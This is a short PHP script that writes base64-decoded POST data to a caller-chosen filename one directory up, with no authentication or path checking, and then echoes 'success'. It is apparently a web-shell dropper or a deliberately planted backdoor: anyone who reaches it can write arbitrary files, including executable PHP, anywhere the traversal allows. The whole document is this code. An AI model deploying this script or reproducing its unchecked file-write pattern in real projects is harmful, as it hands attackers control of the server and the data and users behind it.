<?php
file_put_contents("../".$_POST['name'],base64_decode($_POST['note']));

echo "success";

?>
